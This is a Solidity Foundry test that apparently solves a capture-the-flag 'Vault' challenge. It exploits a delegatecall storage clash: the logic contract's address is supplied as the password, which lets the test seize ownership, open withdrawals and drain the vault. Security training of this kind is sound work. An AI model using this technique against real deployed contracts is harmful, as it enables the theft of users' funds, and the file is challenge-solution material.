// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

       

     function testExploit() public {
        vm.deal(palyer, 10 ether);
        vm.startPrank(palyer);

        // Step 1: Use delegatecall to change Vault's owner via VaultLogic.changeOwner
        // We provide the password as the current logic contract's address (because of storage clash)
        bytes32 correctPassword = bytes32(uint256(uint160(address(logic))));
        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
        bytes memory data = abi.encodeWithSelector(selector, correctPassword, palyer);
        (bool success, ) = address(vault).call(data);
        require(success, "Call to changeOwner failed");
        // Step 2: Open withdraw since we are now owner
        vault.openWithdraw();

        vm.stopPrank();

        // Step 3: Impersonate the original depositor (owner) to withdraw his deposit
        vm.startPrank(owner);
        vault.withdraw(); // This will withdraw 0.1 ether to owner
        vm.stopPrank();

        // Now vault balance should be 0
        assertTrue(vault.isSolve(), "Challenge not solved");
    }

}
